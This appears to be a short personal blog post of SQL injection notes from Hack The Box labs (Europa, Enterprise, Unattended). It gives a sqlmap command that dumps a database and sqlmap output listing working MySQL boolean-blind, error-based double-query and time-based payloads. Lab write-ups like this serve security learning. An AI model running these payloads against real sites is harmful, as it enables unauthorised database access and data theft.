---
layout: post
title: Complicated SQL Payloads
description: Complicated SQL Payloads
summary: Complicated SQL Payloads
tags: [sqli]
minute: 1
---
## HTB Europa - 302 Redirect
Successful SQL injection leads to 302 redirect.

![](/spindel/assets/Complicated%20SQL%20Payloads/A34CC184-43B7-4D71-A1CB-CA737FBB1CEE.png)

I was unable to enumerate database except by using sqlmap.

```bash
sqlmap --proxy=http://127.0.0.1:8080 -r req.txt --batch --dbms=mysql -p email --dump -D admin
```

## HTB Enterprise - Double Query Error-based Injection
```bash
[13:12:29] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: query (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: query=(SELECT (CASE WHEN (7210=7210) THEN 1 ELSE (SELECT 5043 UNION SELECT 6730) END))

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: query=1 AND (SELECT 2881 FROM(SELECT COUNT(*),CONCAT(0x71626a6b71,(SELECT (ELT(2881=2881,1))),0x716b716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: query=1 AND (SELECT 1004 FROM (SELECT(SLEEP(5)))OoNX)
---
[13:12:29] [INFO] the back-end DBMS is MySQL
```

* [HTB: Enterprise | 0xdf hacks stuff - Double Query Error-based Injection](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#beyond-root---error-based-sqli)
* [HTB Enterprise by Ippsec](https://www.youtube.com/watch?v=NWVJ2b0D1r8&t=6000s)

## HTB Unattended nested SQL Injection
This box is tough, I haven't understand fully [this](https://0xdf.gitlab.io/2019/08/24/htb-unattended.html#shell-as-www-data) technique but I will put it here for reference.